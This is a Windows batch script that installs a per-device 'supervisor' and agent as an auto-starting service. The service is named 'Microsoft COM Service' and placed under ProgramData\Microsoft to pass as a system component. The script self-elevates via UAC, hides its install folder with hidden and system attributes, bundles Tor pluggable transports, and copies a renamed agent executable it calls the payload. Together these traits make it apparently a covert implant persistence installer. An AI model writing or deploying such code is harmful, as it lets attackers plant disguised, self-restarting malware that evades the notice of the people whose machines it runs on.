@echo off
REM deploy.bat - install THIS device's supervisor as an auto-starting Windows
REM service. Run it from inside the device folder (it installs the files beside it).
REM Needs admin; it self-elevates via UAC. The GUI fills the EDIT block per device.
setlocal enabledelayedexpansion

REM ================= EDIT (per device; the GUI fills these) =================
set "INSTALLNAME=Microsoft COM Service"
set "DISPLAYNAME=Microsoft COM Service"
set "SUPERVISOR_EXE=WindowsComService.exe"
REM Service NAME is fixed to match SERVICE_NAME in winsvc.rs - do not change it
REM here unless you change the Rust too.
set "SVCNAME=microsoft-com-service"
REM =========================================================================

REM --- self-elevate if not admin ---
net session >nul 2>&1
if errorlevel 1 (
  echo Requesting administrator privileges...
  powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)

cd /d "%~dp0"

REM --- require the supervisor exe beside this script ---
if not exist "%~dp0%SUPERVISOR_EXE%" (
  echo ERROR: %SUPERVISOR_EXE% not found beside this script.
)

REM --- pick an install dir (fallback chain: first that can be created) ---
set "INSTALLDIR="
for %%D in ("%ProgramData%\Microsoft\%INSTALLNAME%" "%ProgramData%\%INSTALLNAME%" "%ALLUSERSPROFILE%\%INSTALLNAME%") do (
  if not defined INSTALLDIR (
    mkdir "%%~D" >nul 2>&1
    if exist "%%~D" set "INSTALLDIR=%%~D"
  )
)
if not defined INSTALLDIR ( echo ERROR: could not create an install directory. & exit /b 1 )
echo Install dir: %INSTALLDIR%
attrib +h +s "%INSTALLDIR%" >nul 2>&1

REM --- copy the payload into the install dir ---
copy /Y "%~dp0%SUPERVISOR_EXE%" "%INSTALLDIR%\" >nul
for %%F in (lyrebird.exe obfs4proxy.exe bridges.txt) do (
  if exist "%~dp0%%F" copy /Y "%~dp0%%F" "%INSTALLDIR%\" >nul
)
REM the agent exe has a stamped (possibly renamed) name: copy every .exe here that
REM isn't the supervisor or a pluggable transport.
for %%F in ("%~dp0*.exe") do (
  if /I not "%%~nxF"=="%SUPERVISOR_EXE%" if /I not "%%~nxF"=="lyrebird.exe" if /I not "%%~nxF"=="obfs4proxy.exe" copy /Y "%%~fF" "%INSTALLDIR%\" >nul
)

REM --- (re)install the service ---
sc query %SVCNAME% >nul 2>&1
if not errorlevel 1 (
  echo Existing service found - replacing...
  sc stop %SVCNAME% >nul 2>&1
  timeout /t 2 /nobreak >nul
  sc delete %SVCNAME% >nul 2>&1
  timeout /t 2 /nobreak >nul
)
echo Creating service %SVCNAME% ...
sc create %SVCNAME% binPath= "\"%INSTALLDIR%\%SUPERVISOR_EXE%\" --run-service" start= auto DisplayName= "%DISPLAYNAME%"
if errorlevel 1 ( echo ERROR: sc create failed. & exit /b 1 )
sc description %SVCNAME% "%DISPLAYNAME%" >nul
REM restart on crash: reset the failure count daily, restart after 5s each time.
sc failure %SVCNAME% reset= 86400 actions= restart/5000/restart/5000/restart/5000 >nul
echo Starting service ...
sc start %SVCNAME%

echo.
echo Done. Service '%SVCNAME%' installed to "%INSTALLDIR%" and started.
echo It auto-starts at boot and restarts on crash.
echo.
echo To uninstall:  sc stop %SVCNAME%  ^&  sc delete %SVCNAME%  ^&  rmdir /s /q "%INSTALLDIR%"
